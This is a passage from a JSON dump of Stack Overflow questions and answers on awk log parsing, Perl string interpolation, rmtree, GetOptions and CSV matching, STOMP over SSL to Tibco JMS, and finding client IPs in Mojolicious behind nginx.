awk -f tst.awk file\n1 1453725026 176.237.167.102\n</code></pre>\n"}], "owner": {"reputation": 61, "user_id": 4669326, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/01bc3c5413f8faf7ab5d3409d0e3875d?s=128&d=identicon&r=PG&f=1", "display_name": "SScast", "link": "https://stackoverflow.com/users/4669326/sscast"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 80, "favorite_count": 0, "accepted_answer_id": 35318726, "answer_count": 1, "score": -1, "last_activity_date": 1455116799, "creation_date": 1455109017, "last_edit_date": 1455115786, "question_id": 35315937, "link": "https://stackoverflow.com/questions/35315937/awk-date-to-epoch-in-log-file-and-print-other-columns-also", "title": "awk date to epoch in log file and print other columns also", "body": "<p>I have a log file where i need to output the DATE and some status codes. Also i`m using || as delimiter and remove unwanted symbols from the data. Here is how it looks like:</p>\n\n<pre><code>cat logfile.log | awk 'BEGIN { FS = \"\\\\|\\\\|\" } { gsub(\"/\",\"-\")  sub(\":\", \" \") gsub(\"\\\\[\", \"\") gsub(\"\\\\+0000]\", \"\")}; { print $15 $12 }' | uniq -c\n</code></pre>\n\n<p>This outputs:</p>\n\n<pre><code>  22  25-Jan-2016 01:53:52  85.10.210.199\n  1   25-Jan-2016 01:53:52   66.249.93.77\n  18  25-Jan-2016 01:53:52   85.10.210.199\n  1   25-Jan-2016 01:53:52   88.232.191.231\n</code></pre>\n\n<p>After this i need to convert the time to epoch and still print column $1 and $3</p>\n\n<p>I want to achive:</p>\n\n<pre><code>  22  1453686832  85.10.210.199\n  1   1453686832   66.249.93.77\n  18  1453686832   85.10.210.199\n  1   1453686832   88.232.191.231\n</code></pre>\n\n<p>I can transform the date to epoch but i lose the other columns. How can i keep them also with transformed time?</p>\n\n<p>This is my RAW log file:</p>\n\n<pre><code>[] ||  ||  ||  || [] || http || 40080 || 176.237.167.102 || [] || [-] || [0.072] || 176.237.167.102 || - || - || [25/Jan/2016:06:30:26 +0000] || \"POST /checknewmsg HTTP/1.1\" || 200 || 265 || 895 || \"http://google.com/post\u201d || \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36\" || \"-\" || [TR]\n</code></pre>\n"}, {"tags": ["perl", "escaping", "rename", "double-quotes"], "answers": [{"comments": [{"owner": {"reputation": 6130, "user_id": 299242, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f9bda794bc71267206358bf04ea0a179?s=128&d=identicon&r=PG", "display_name": "mscha", "link": "https://stackoverflow.com/users/299242/mscha"}, "edited": false, "score": 1, "creation_date": 1455108075, "post_id": 35315553, "comment_id": 58339747, "body": "Or simply <code>$variable1 . &#39;CHARACTERS&#39; . $variable2</code>."}, {"owner": {"reputation": 35, "user_id": 5174810, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/8a346783a211f34ed164c27618ef2de8?s=128&d=identicon&r=PG&f=1", "display_name": "kouki", "link": "https://stackoverflow.com/users/5174810/kouki"}, "edited": false, "score": 0, "creation_date": 1455108116, "post_id": 35315553, "comment_id": 58339782, "body": "Thank you so much. After your answer I remembered I had used braces for the same purpose in a much older script I had written. Again thanks, greatly appreciated, there was no chance it would cross my mind, I was stuck with the forward slash and quotes."}, {"owner": {"reputation": 137100, "user_id": 874188, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/ZcY77.png?s=128&g=1", "display_name": "tripleee", "link": "https://stackoverflow.com/users/874188/tripleee"}, "reply_to_user": {"reputation": 6130, "user_id": 299242, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f9bda794bc71267206358bf04ea0a179?s=128&d=identicon&r=PG", "display_name": "mscha", "link": "https://stackoverflow.com/users/299242/mscha"}, "edited": false, "score": 1, "creation_date": 1455108157, "post_id": 35315553, "comment_id": 58339817, "body": "@mscha Yeah, although I expect a single join to be more efficient than repeated dot pasting. Either is fine if you&#39;re not in a tight loop."}, {"owner": {"reputation": 6130, "user_id": 299242, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f9bda794bc71267206358bf04ea0a179?s=128&d=identicon&r=PG", "display_name": "mscha", "link": "https://stackoverflow.com/users/299242/mscha"}, "edited": false, "score": 1, "creation_date": 1455108808, "post_id": 35315553, "comment_id": 58340295, "body": "@tripleee: I tested it out, and in fact, <code>join</code> is the slowest solution.  It&#39;s about 10% slower than string contatenation.  The fastest solution is the interpolated version with braces, that&#39;s about 10% faster again.  (Tested with perl 5.22.0.)"}], "tags": [], "owner": {"reputation": 137100, "user_id": 874188, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/ZcY77.png?s=128&g=1", "display_name": "tripleee", "link": "https://stackoverflow.com/users/874188/tripleee"}, "is_accepted": true, "score": 3, "last_activity_date": 1455107919, "creation_date": 1455107919, "answer_id": 35315553, "question_id": 35314728, "link": "https://stackoverflow.com/questions/35314728/perl-escape-characters-immediately-adjacent-to-variables-inside-double-quotes/35315553#35315553", "title": "Perl: escape characters immediately adjacent to variables, inside double quotes", "body": "<p>Like in the shell, you can use braces to delimit a variable name.</p>\n\n<pre><code>my $oldname = \"${variable1}CHARACTERS${variable2}.txt\";\n</code></pre>\n\n<p>The braces are not strictly necessary to disambiguate <code>$variable2</code> here (the period is not allowed in a variable name, so it has to end there) but you can use them just for symmetry.</p>\n\n<p>In your limited scenario, you could also keep the strings separate, and join them:</p>\n\n<pre><code>my $oldname = join(\"\", $variable1, \"CHARACTERS\", $variable2, \".txt\");\n</code></pre>\n"}], "owner": {"reputation": 35, "user_id": 5174810, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/8a346783a211f34ed164c27618ef2de8?s=128&d=identicon&r=PG&f=1", "display_name": "kouki", "link": "https://stackoverflow.com/users/5174810/kouki"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 114, "favorite_count": 0, "accepted_answer_id": 35315553, "answer_count": 1, "score": 0, "last_activity_date": 1455107919, "creation_date": 1455105769, "last_edit_date": 1455106647, "question_id": 35314728, "link": "https://stackoverflow.com/questions/35314728/perl-escape-characters-immediately-adjacent-to-variables-inside-double-quotes", "title": "Perl: escape characters immediately adjacent to variables, inside double quotes", "body": "<p>I've been trying to use perl's function <code>rename</code> in order to rename a large number of files. The problem I've encountered is that my variable <code>my $oldname</code> is made up from a name along the lines of variable, characters, variable, as in <code>my $oldname = \"$variable1CHARACTERS$variable2.txt\";</code></p>\n\n<p>I have used a multitude of options to escape the characters (single quotes, apostrophe, slash and loads of combinations) but it never works properly so renaming fails. Has anybody ever faced this problem? I think that the solution is through more double quotes, maybe put CHARACTERS under double quotes - but still haven't found a syntax that works. Any hints would be greatly appreciated.</p>\n"}, {"tags": ["perl"], "answers": [{"comments": [{"owner": {"reputation": 9406, "user_id": 4923629, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/2abZO.png?s=128&g=1", "display_name": "123", "link": "https://stackoverflow.com/users/4923629/123"}, "edited": false, "score": 0, "creation_date": 1455108303, "post_id": 35314844, "comment_id": 58339917, "body": "Cheers, i thought it would be something like that but seem to have missed the obvious! Also the semi colon was a typo, sorry :)"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 9406, "user_id": 4923629, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/2abZO.png?s=128&g=1", "display_name": "123", "link": "https://stackoverflow.com/users/4923629/123"}, "edited": false, "score": 1, "creation_date": 1455108748, "post_id": 35314844, "comment_id": 58340242, "body": "@123 that happens to the best :)"}], "tags": [], "owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "is_accepted": true, "score": 3, "last_activity_date": 1455119229, "last_edit_date": 1455119229, "creation_date": 1455106117, "answer_id": 35314844, "question_id": 35314644, "link": "https://stackoverflow.com/questions/35314644/difference-between-action-for-condition-and-for-varcondition-action-var/35314844#35314844", "title": "Difference between `ACTION for CONDITION` and for `VAR(CONDITION) ACTION VAR`", "body": "<p><code>rmtree</code> is not a built-in, so it does not use <code>$_</code>as the default argument if no arguments are given. You need to pass it explicitly in your second example.</p>\n\n<pre><code>rmtree $_ for grep{ -d &amp;&amp; /^1234$/} readdir $dh;\n</code></pre>\n\n<p>If a CPAN module provides a function that works on <code>$_</code>, it will always state that in the documentation. That's not the case here. Also not all of Perl's built-ins do that. The documentation in <a href=\"http://perldoc.perl.org/perlfunc.html\" rel=\"nofollow\">perlfunc</a> will also explicitly this for each of them.</p>\n"}], "owner": {"reputation": 9406, "user_id": 4923629, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/2abZO.png?s=128&g=1", "display_name": "123", "link": "https://stackoverflow.com/users/4923629/123"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 76, "favorite_count": 0, "accepted_answer_id": 35314844, "answer_count": 1, "score": 0, "last_activity_date": 1455119229, "creation_date": 1455105554, "last_edit_date": 1592644375, "question_id": 35314644, "link": "https://stackoverflow.com/questions/35314644/difference-between-action-for-condition-and-for-varcondition-action-var", "title": "Difference between `ACTION for CONDITION` and for `VAR(CONDITION) ACTION VAR`", "body": "<h3>Question</h3>\n<p>What are the differences between the way these two commands process the data.</p>\n<hr />\n<h3>Preexample</h3>\n<p>These commands are used to create the example data</p>\n<pre><code>mkdir 1234\n\ntouch 1234/123\n</code></pre>\n<hr />\n<h3>Example</h3>\n<pre><code>use strict;\nuse warnings;\nuse File::Path;\n\nopendir my($dh),&quot;.&quot;;\nfor my $i (grep{ -d &amp;&amp; /^(\\d*)_\\1/} readdir $dh){\nrmtree $i\n}\n</code></pre>\n<p>This removes the directory and all contents as intended.</p>\n<hr />\n<pre><code>use strict;\nuse warnings;\nuse File::Path;\n\nopendir my($dh),&quot;.&quot;;\nrmtree for grep{ -d &amp;&amp; /^1234$/} readdir $dh\n</code></pre>\n<p>This doesn't remove the directory nor gives an error</p>\n<hr />\n<h3>Expected behaviour</h3>\n<p>Would be to remove the directory for both.</p>\n<hr />\n<h3>Versions</h3>\n<pre><code>perl, v5.10.0\nGNU bash, version 3.2.51\n</code></pre>\n<hr />\n<h3>Extra</h3>\n<p>If i replace the <code>rmtree</code> command with <code>print</code> then it prints all the folders correctly. So this may be to do with the way certain commands handle arguments and how these args are supplied by the different for types.</p>\n<hr />\n<p>Any further information needed just ask.</p>\n"}, {"tags": ["perl", "hash", "reference"], "comments": [{"owner": {"reputation": 3334, "user_id": 4473327, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hP14q.jpg?s=128&g=1", "display_name": "neuhaus", "link": "https://stackoverflow.com/users/4473327/neuhaus"}, "edited": false, "score": 1, "creation_date": 1455103260, "post_id": 35313634, "comment_id": 58336360, "body": "you can iterate through the hashref using keys(%$rah_airports) and/or values()"}, {"owner": {"reputation": 6130, "user_id": 299242, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f9bda794bc71267206358bf04ea0a179?s=128&d=identicon&r=PG", "display_name": "mscha", "link": "https://stackoverflow.com/users/299242/mscha"}, "edited": false, "score": 1, "creation_date": 1455104157, "post_id": 35313634, "comment_id": 58336957, "body": "You&#39;ll have to explain what you mean with \u201csimilar names\u201d and give a few examples of what you do and do not consider similar."}, {"owner": {"reputation": 12075, "user_id": 1137055, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/59d7b43b9eb7d01bd8f7e51febe6053c?s=128&d=identicon&r=PG", "display_name": "dgw", "link": "https://stackoverflow.com/users/1137055/dgw"}, "edited": false, "score": 0, "creation_date": 1455105835, "post_id": 35313634, "comment_id": 58338144, "body": "<a href=\"http://whathaveyoutried.com/\" rel=\"nofollow noreferrer\">What have you tried?</a> SO is not a write-some-code-for-me site. You&#39;ll have to try for yourself and when you&#39;re stuck somewhere then state your problem here and you&#39;ll get help."}, {"owner": {"reputation": 460, "user_id": 4782247, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/a44J6.jpg?s=128&g=1", "display_name": "imbatman", "link": "https://stackoverflow.com/users/4782247/imbatman"}, "reply_to_user": {"reputation": 12075, "user_id": 1137055, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/59d7b43b9eb7d01bd8f7e51febe6053c?s=128&d=identicon&r=PG", "display_name": "dgw", "link": "https://stackoverflow.com/users/1137055/dgw"}, "edited": false, "score": 0, "creation_date": 1455111114, "post_id": 35313634, "comment_id": 58341989, "body": "@dgw - k. Clearly your rep goes to your head. Don&#39;t troll the site or my thread. CLEARLY - I am stuck at this point, as mentioned."}], "answers": [{"comments": [{"owner": {"reputation": 460, "user_id": 4782247, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/a44J6.jpg?s=128&g=1", "display_name": "imbatman", "link": "https://stackoverflow.com/users/4782247/imbatman"}, "edited": false, "score": 0, "creation_date": 1455111043, "post_id": 35315520, "comment_id": 58341920, "body": "I have tried something like that and I always receive an error about &quot;Bareword &#39;name&#39; not allowed while &#39;strict subs&#39; in use&quot;. Not sure what that means - as I am very new to perl, 1 week in."}, {"owner": {"reputation": 68, "user_id": 5850890, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/pmQPR.jpg?s=128&g=1", "display_name": "JMa", "link": "https://stackoverflow.com/users/5850890/jma"}, "reply_to_user": {"reputation": 460, "user_id": 4782247, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/a44J6.jpg?s=128&g=1", "display_name": "imbatman", "link": "https://stackoverflow.com/users/4782247/imbatman"}, "edited": false, "score": 0, "creation_date": 1455111792, "post_id": 35315520, "comment_id": 58342483, "body": "It means you have used literal string without quotation - this is not allowed when &quot;strict&quot; pragma is used. Paste appropriate snippet of your code, pls."}, {"owner": {"reputation": 460, "user_id": 4782247, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/a44J6.jpg?s=128&g=1", "display_name": "imbatman", "link": "https://stackoverflow.com/users/4782247/imbatman"}, "edited": false, "score": 0, "creation_date": 1455290058, "post_id": 35315520, "comment_id": 58437816, "body": "JMa - I was able to build a solution for the problem I had - thank you for your input and time."}], "tags": [], "owner": {"reputation": 68, "user_id": 5850890, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/pmQPR.jpg?s=128&g=1", "display_name": "JMa", "link": "https://stackoverflow.com/users/5850890/jma"}, "is_accepted": true, "score": 1, "last_activity_date": 1455117464, "last_edit_date": 1455117464, "creation_date": 1455107828, "answer_id": 35315520, "question_id": 35313634, "link": "https://stackoverflow.com/questions/35313634/getoption-perl-referencing/35315520#35315520", "title": "GetOption - Perl - Referencing", "body": "<p>Example: </p>\n\n<pre><code>for my $Airport_rf (keys %{$rah_airports}) {\n    if ( $Airport_rf-&gt;{NAME} =~ m{\\Q$matching\\E}xi) {\n        # do your stuff here\n    }\n}\n</code></pre>\n\n<p>If you don\u00b4t know the exact key of the hashref, you have to match the CLI parameter against all values.</p>\n"}], "owner": {"reputation": 460, "user_id": 4782247, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/a44J6.jpg?s=128&g=1", "display_name": "imbatman", "link": "https://stackoverflow.com/users/4782247/imbatman"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 134, "favorite_count": 1, "accepted_answer_id": 35315520, "answer_count": 1, "score": 0, "last_activity_date": 1455285731, "creation_date": 1455102874, "last_edit_date": 1455285731, "question_id": 35313634, "link": "https://stackoverflow.com/questions/35313634/getoption-perl-referencing", "title": "GetOption - Perl - Referencing", "body": "<p>So I have stumbled upon a little issue when trying to build out a simple \"Airport Search Script\" in Perl. </p>\n\n<pre><code>my $filename = '/home/student/perl-basic/topic-07/iata_airports.csv';\nmy $number = '1';\nmy $matching;\nmy $latitude;\nmy $longitude;\nmy $word = 'false';\n\nGetOptions (\n        \"filename=s\"    =&gt;      \\$filename,\n        \"number=i\"      =&gt;      \\$number,\n        \"matching=s\"    =&gt;      \\$matching,\n        \"latitude=f\"    =&gt;      \\$latitude,\n        \"longitude=f\"   =&gt;      \\$longitude,\n        \"word=s\"        =&gt;      \\$word\n);\n\nsub parse_airports {\n\n        my $file = shift;\n\n        my $csv = Text::CSV-&gt;new( { binary =&gt; 1, eol =&gt; $/ } );\n\n        open ( my $fh, \"&lt;\", $file ), or die \"Error opening input file: $!\";\n\n                my $ra_colnames = $csv-&gt;getline ( $fh );\n                        $csv-&gt;column_names( @$ra_colnames );\n\n                my $ra_airports = $csv-&gt;getline_hr_all( $fh );\n\n        close ( $fh );\n\n        return $ra_airports;\n\n}\n\nsub get_name_matching_airports {\n\n\n\n}\n\nmy $rah_airports = parse_airports( $filename );\nmy $rah_airports_found = [];\n\nif ($matching) {\n  say \"Up to $number airports matching $matching in $filename:\";\n        $rah_airports_found = get_name_matching_airports(\n        airports        =&gt; $rah_airports,\n        matching_string =&gt; $matching,\n        word            =&gt; $word,\n  );\n}\nelsif ($latitude &amp;&amp; $longitude) {\n  say \"Up to $number airports near [$latitude, $longitude] in $filename:\"\n}\nelse {\n  say \"Must have at least --matching, or --latitude and --longitude as arguments\";\n}\n\nprint pp($rah_airports_found);\n</code></pre>\n\n<p>So where I am struggling is in the \"sub get_name_matching_airports\"</p>\n\n<p>Because you do not have the file let me explain the file structure. \nIt is a hash (ALL IATA Airports) with hashes (DETAILS of each airport). There are around 15 keys in each airport hash and one of the keys titles is (NAME). I have opened the file and parsed all the info into a hash ref which is returned at the end of the sub \"parse_airports\".</p>\n\n<p>In the sub \"get_name_matching_airports\" I need to find additional airports with similar names based on the argument I passed in, into ($matching).</p>\n\n<p>EXAMPLE: I parse (case-insensitive) \"London\" as an argument from the command line e.g. ./search_airports2 --matching London. In the sub \"get_name_matching_airports\" I will need to respond with any airport that has london (case-insensitive) in key(name).</p>\n\n<p>Then push these newly found airports which are similar into the array \"rah_airports_found\" and in the end print this out. </p>\n\n<p>SO I SOLVED MY PROBLEM WITH THE FOLLOWING CODE: </p>\n\n<pre><code>sub get_name_matching_airports {\n\n        my %params = (\n                airports        =&gt; undef,\n                matching_string =&gt; undef,\n                word            =&gt; undef,\n                @_\n        );\n\n        my @rah_airports_found;\n\n        my $ra_airports = $params{airports};\n        my $counter = 0;\n\n        foreach my $i ( @$ra_airports ) {\n                if ( $params{word} ) {\n                        if ( $i-&gt;{name} eq $params{matching_string} ) {\n                                push @rah_airports_found, $i;\n                                $counter++;\n                                }\n                        }\n                        else {\n                        if ( $i-&gt;{name} =~ /$params{matching_string}/i ) {\n                                push @rah_airports_found, $i;\n                                $counter++;\n                        }\n                        if ( defined( $number ) &amp;&amp; $counter == $number ) {\n                                return \\@rah_airports_found;\n                        }\n                }\n        }\n\n        return \\@rah_airports_found;\n\n}\n</code></pre>\n"}, {"tags": ["perl", "jms", "stomp", "tibco", "tibco-ems"], "comments": [{"owner": {"reputation": 35441, "user_id": 80901, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/fH9bB.png?s=128&g=1", "display_name": "mjn", "link": "https://stackoverflow.com/users/80901/mjn"}, "edited": false, "score": 0, "creation_date": 1455463371, "post_id": 35312221, "comment_id": 58490558, "body": "Use a network sniffer or other tools to inspect the server response. If the server does not respond with a CONNECTED frame, maybe it is not the right port or the server does not support Stomp"}], "owner": {"reputation": 83, "user_id": 3669003, "user_type": "registered", "accept_rate": 25, "profile_image": "https://graph.facebook.com/1510334485/picture?type=large", "display_name": "Vivek Sharma", "link": "https://stackoverflow.com/users/3669003/vivek-sharma"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 210, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1455567623, "creation_date": 1455099037, "last_edit_date": 1455567623, "question_id": 35312221, "link": "https://stackoverflow.com/questions/35312221/cannot-sysread-eof-error-while-connecting-to-tibco-jms-topic-using-net-sto", "title": "Cannot sysread (): EOF Error while connecting to Tibco JMS Topic using Net:: STOMP:: Client", "body": "<p>I am using the <code>Net::STOMP::Client</code> module to connect to a Tibco JMS Topic Server which is not hosted by me.</p>\n\n<p>I am trying the SSL approach for which, I have a <code>certificate.p12</code> file from which I generated <code>cert.pem</code> &amp; <code>key.pem</code> and passed it to <code>Net::Stomp::Client</code>. I am using the <code>Authen::Credential::x509</code> module for cert based authentication.</p>\n\n<p>Now I am getting the following Error when I am trying to run the perl script:</p>\n\n<pre><code>DEBUG: .../IO/Socket/SSL.pm:605: socket not yet connected\nDEBUG: .../IO/Socket/SSL.pm:607: socket connected\nDEBUG: .../IO/Socket/SSL.pm:629: ssl handshake not started\nDEBUG: .../IO/Socket/SSL.pm:662: using SNI with hostname mmx-nprd3-07.cisco.com\nDEBUG: .../IO/Socket/SSL.pm:697: request OCSP stapling\nDEBUG: .../IO/Socket/SSL.pm:787: ssl handshake done\n# 2016/02/10-07:18:33 JmsClient.pl[6618]: connect to stomp+ssl://mmx-ntard-07.sammy.com:7222 ok: 160.**.1**.**2\n\nStomp Client Object Created\n\nConnected to broker mmx-ntard-07.sammy.com (IP 1**.*8.**.**2), port 7222\n\n# 2016/02/10-07:18:33 JmsClient.pl[6618]: Net::STOMP::Client=HASH(0x194df00)-&gt;connect()\n# 2016/02/10-07:18:33 JmsClient.pl[6618]: encoding CONNECT frame\n# 2016/02/10-07:18:33 JmsClient.pl[6618]:  H accept-version:1.0,1.1,1.2\n# 2016/02/10-07:18:33 JmsClient.pl[6618]:  H host:mmx-ntard-07.sammy.com\n# 2016/02/10-07:18:33 JmsClient.pl[6618]: sent 65 bytes\n# 2016/02/10-07:18:33 JmsClient.pl[6618]: received 12 bytes\n# 2016/02/10-07:18:34 JmsClient.pl[6618]: received 0 bytes\ncannot sysread(): EOF\n</code></pre>\n\n<p>Below is the perl script :-</p>\n\n<pre><code>use Net::STOMP::Client;\nuse No::Worries::Log qw(*);\nuse IO::Socket::SSL;\nuse FindBin qw($Bin);\nuse Authen::Credential::x509;\n\n$IO::Socket::SSL::DEBUG = 2;\n\n log_filter(\"debug\");\n\n my $auth = Authen::Credential::x509-&gt;new(\n    # client certificate to present\n    cert =&gt; \"$Bin/JmsCertificate/aix_jms_public_Cert.pem\",\n    # # client private key\n    key  =&gt; \"$Bin/JmsCertificate/aix_jms_private_Key.pem\",\n    pass =&gt; 'password'\n );\n\n my $stomp = Net::STOMP::Client-&gt;new(\n    uri   =&gt; \"stomp+ssl://mmx-ntard-07.sammy.com:7222\",\n      auth  =&gt; $auth,\n      debug =&gt; 'all',\n  );\n\n  print \"\\nStomp Client Object Created\";\n  my $peer = $stomp-&gt;peer();\n  printf(\"\\nConnected to broker %s (IP %s), port %d\\n\", $peer-&gt;host(), $peer-&gt;addr(), $peer-&gt;port());\n\n  $stomp-&gt;connect();\n\n  print \"\\nConnected\\n\";\n\n  my $sid = $stomp-&gt;uuid();\n  $stomp-&gt;subscribe(\n      destination =&gt; \"/queue/test\",\n      # we use the generated subscription id\n      id          =&gt; $sid,\n      # we want a receipt on our SUBSCRIBE frame\n      receipt     =&gt; $stomp-&gt;uuid(),\n  );\n  my $count = 0;\n  my $frame;\n\n  while ($count &lt; 10) {\n      $frame = $stomp-&gt;wait_for_frames(timeout =&gt; 1);\n      if ($frame) {\n          if ($frame-&gt;command() eq \"MESSAGE\") {\n              $count++;\n              printf(\"received message %d with id %s\\n\",\n                     $count, $frame-&gt;header(\"message-id\"));\n          } else {\n              # this will catch the RECEIPT frame\n              printf(\"%s frame received\\n\", $frame-&gt;command());\n          }\n      } else {\n          print(\"waiting for messages...\\n\");\n      }\n  }\n  $stomp-&gt;unsubscribe(id =&gt; $sid);\n  $stomp-&gt;disconnect();\n</code></pre>\n\n<p>I am not able to figure out what is going on here. I saw couple of other posts too but they were for ActiveMQ. I'm not sure if that would make a difference.</p>\n"}, {"tags": ["api", "perl", "mojolicious"], "comments": [{"owner": {"reputation": 3334, "user_id": 4473327, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hP14q.jpg?s=128&g=1", "display_name": "neuhaus", "link": "https://stackoverflow.com/users/4473327/neuhaus"}, "edited": false, "score": 0, "creation_date": 1455099053, "post_id": 35312054, "comment_id": 58333540, "body": "see <a href=\"https://stackoverflow.com/questions/24104937/logging-of-ip-address-transaction-id-or-session-id-in-mojolog\" title=\"logging of ip address transaction id or session id in mojolog\">stackoverflow.com/questions/24104937/&hellip;</a>"}, {"owner": {"reputation": 33, "user_id": 3178066, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/7d0364a6f20ebcd9813738580fb63a7b?s=128&d=identicon&r=PG&f=1", "display_name": "Caledonia91", "link": "https://stackoverflow.com/users/3178066/caledonia91"}, "reply_to_user": {"reputation": 3334, "user_id": 4473327, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hP14q.jpg?s=128&g=1", "display_name": "neuhaus", "link": "https://stackoverflow.com/users/4473327/neuhaus"}, "edited": false, "score": 0, "creation_date": 1455099148, "post_id": 35312054, "comment_id": 58333600, "body": "The remote_address function returns the client IP, not the IP of the server calling my API."}, {"owner": {"reputation": 3334, "user_id": 4473327, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hP14q.jpg?s=128&g=1", "display_name": "neuhaus", "link": "https://stackoverflow.com/users/4473327/neuhaus"}, "edited": false, "score": 0, "creation_date": 1455099287, "post_id": 35312054, "comment_id": 58333694, "body": "The &quot;server&quot; calling your API is the client."}, {"owner": {"reputation": 33, "user_id": 3178066, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/7d0364a6f20ebcd9813738580fb63a7b?s=128&d=identicon&r=PG&f=1", "display_name": "Caledonia91", "link": "https://stackoverflow.com/users/3178066/caledonia91"}, "reply_to_user": {"reputation": 3334, "user_id": 4473327, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hP14q.jpg?s=128&g=1", "display_name": "neuhaus", "link": "https://stackoverflow.com/users/4473327/neuhaus"}, "edited": false, "score": 0, "creation_date": 1455099967, "post_id": 35312054, "comment_id": 58334155, "body": "Actually now it&#39;s showing 127.0.0.1, probably because my API web server is running behind Nginx."}, {"owner": {"reputation": 3334, "user_id": 4473327, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hP14q.jpg?s=128&g=1", "display_name": "neuhaus", "link": "https://stackoverflow.com/users/4473327/neuhaus"}, "edited": false, "score": 1, "creation_date": 1455100795, "post_id": 35312054, "comment_id": 58334721, "body": "You need to configure nginx to stick the real client IP address into some other environment variable then"}], "answers": [{"tags": [], "owner": {"reputation": 528, "user_id": 1815811, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/OdnDK.jpg?s=128&g=1", "display_name": "vitas", "link": "https://stackoverflow.com/users/1815811/vitas"}, "is_accepted": false, "score": 2, "last_activity_date": 1458138890, "creation_date": 1458138890, "answer_id": 36038744, "question_id": 35312054, "link": "https://stackoverflow.com/questions/35312054/mojolicious-perl-getting-ip-from-packet/36038744#36038744", "title": "Mojolicious / Perl - Getting IP from packet?", "body": "<p>I use own helper <code>src_addr</code>:</p>\n\n<pre><code>use Net::IP::Lite;\n\n$app-&gt;helper( src_addr =&gt; sub {\n  my $c = shift;\n  my $xff = $c-&gt;req-&gt;headers-&gt;header('X-Real-IP') // $c-&gt;req-&gt;headers-&gt;header('X-Forwarded-For') // '';\n\n  if($xff) {\n    for my $ip (reverse split(/[\\s,]+/, $xff)) {\n      next if ! ip_validate($ip);\n      return $ip;\n    }\n  }\n  return $c-&gt;tx-&gt;remote_address;\n});\n</code></pre>\n\n<p>In nginx:</p>\n\n<pre><code>    location / {\n            proxy_read_timeout 300;\n            proxy_pass http://localhost4:54329/;\n            proxy_set_header Host $host;\n            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n            proxy_set_header X-Forwarded-Proto \"https\";\n            proxy_set_header X-Forwarded-HTTPS 1;\n    }\n</code></pre>\n"}], "owner": {"reputation": 33, "user_id": 3178066, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/7d0364a6f20ebcd9813738580fb63a7b?s=128&d=identicon&r=PG&f=1", "display_name": "Caledonia91", "link": "https://stackoverflow.com/users/3178066/caledonia91"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 417, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1590349283, "creation_date": 1455098625, "last_edit_date": 1578633480, "question_id": 35312054, "link": "https://stackoverflow.com/questions/35312054/mojolicious-perl-getting-ip-from-packet", "title": "Mojolicious / Perl - Getting IP from packet?", "body": "<p>I've written an API using the Perl 'Mojolicious' framework that recieves requests from other web servers via CORS, however I'm having trouble extracting the IP address of the <strong>requesting server</strong>.</p>\n\n<p>Extracting headers like <code>X-Forwarded-For</code> only gives the IP address of the client? Is there any way in Perl or Mojolicious to extract the source IP from the IP packet itself?</p>\n\n<p>Using the inbuilt Mojolicious <code>$self-&gt;tx-&gt;remote_address</code> method doesn't work because my API web server sits behind an Nginx reverse proxy.</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 60461, "user_id": 3636601, "user_type": "registered", "accept_rate": 75, 